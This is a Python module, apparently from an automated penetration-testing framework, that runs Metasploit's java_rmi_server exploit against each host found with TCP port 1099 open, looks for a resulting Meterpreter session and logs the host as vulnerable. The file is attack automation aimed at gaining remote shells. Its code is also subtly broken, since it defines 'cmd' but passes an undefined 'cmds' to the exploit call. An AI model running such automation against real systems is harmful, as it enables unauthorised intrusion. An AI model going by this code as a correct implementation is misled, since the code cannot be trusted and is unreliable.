import re

from core.msfActionModule import msfActionModule
from core.keystore import KeyStore as kb
from core.utils import Utils

class exploit_msf_javarmi(msfActionModule):
    def __init__(self, config, display, lock):
        super(exploit_msf_javarmi, self).__init__(config, display, lock)
        self.triggers = ["newPort_tcp_1099"]
        self.requirements = ["msfconsole"]
        self.title = "Attempt to Exploit A Java RMI Service"
        self.shortName = "MSFJavaRMI"
        self.description = "execute [exploit/multi/misc/java_rmi_server] on each target"
        self.safeLevel = 5

    def getTargets(self):
        self.targets = kb.get('port/tcp/1099')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        if len(self.targets) > 0:
            # If any results are succesful, this will become true and Fire will be called in the end
            callFire = False
            # loop over each target
            for t in self.targets:
                # verify we have not tested this host before
                if not self.seentarget(t):
                    # add the new IP to the already seen list
                    self.addseentarget(t)

                    cmd = {
                            'config':[
                                    "use exploit/multi/misc/java_rmi_server",
                                    "set RHOST %s" % t,
                                    "set TARGET 2"
                                ],
                            'payload':'linux'}
                    result, outfile = self.msfExec(t, cmds)

                    parts = re.findall(".*Meterpreter session.*", result)
                    for part in parts:
                        callFire = True
                        self.addVuln(t, "JavaRMI", {"port": "1099", "output": outfile.replace("/", "%2F")})

            if callFire:
                self.fire("msfSession")

        return
